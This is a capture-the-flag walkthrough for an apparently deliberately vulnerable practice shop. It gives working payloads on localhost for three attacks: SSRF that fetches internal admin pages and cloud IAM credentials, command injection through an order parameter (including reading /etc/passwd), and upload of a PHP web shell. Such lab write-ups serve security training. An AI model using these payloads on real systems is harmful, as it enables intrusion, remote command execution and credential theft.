# SSRF, Command Injection, File Upload — PhantomShop Walkthroughs

## SSRF — Newsletter URL (Medium — 200pts)
**Flag:** `FLAG{ssrf_1nt3rn4l}`
**Location:** `/api/newsletter`

### Vulnerability
The newsletter subscription accepts a "blog URL" and the server fetches it:
```go
client.Get(url) // Fetches any URL including internal services
```

### Solution
```bash
curl -X POST http://localhost:8080/api/newsletter \
  -d "email=test@test.com&url=http://127.0.0.1:9999/internal/admin"
```
Returns the internal admin page with credentials and the flag.

### Cloud metadata (bonus)
```bash
curl -X POST http://localhost:8080/api/newsletter \
  -d "email=test@test.com&url=http://127.0.0.1:9999/latest/meta-data/iam/security-credentials/"
```
Returns simulated AWS IAM credentials.

---

## Command Injection — Invoice Generator (Medium — 200pts)
**Flag:** `FLAG{cmd_1nj3ct_pdf}`
**Location:** `/admin/invoice?order=`

### Prerequisite
Access admin panel first (set `role=admin` cookie).

### Vulnerability
```go
cmd := fmt.Sprintf("echo 'Invoice for order %s generated'", orderID)
exec.Command("sh", "-c", cmd)
```

### Solution
```
/admin/invoice?order=1;id
/admin/invoice?order=1;cat /etc/passwd
/admin/invoice?order=1$(whoami)
```

### From curl
```bash
curl -b "role=admin" "http://localhost:8080/admin/invoice?order=1;id"
```

---

## File Upload — Avatar (Medium — 200pts)
**Flag:** `FLAG{sh3ll_upl04d_4v4t4r}`
**Location:** `/profile/avatar`

### Vulnerability
No file type validation — upload anything as your avatar.

### Solution
```bash
echo '<?php system($_GET["c"]); ?>' > shell.php
curl -b "user_id=1" -F "avatar=@shell.php" http://localhost:8080/profile/avatar
```

Or create a file named `shell.php.jpg` with PHP content:
```bash
echo 'PHANTOM_SHELL <?php phpinfo(); ?>' > avatar.php
curl -b "user_id=1" -F "avatar=@avatar.php" http://localhost:8080/profile/avatar
```
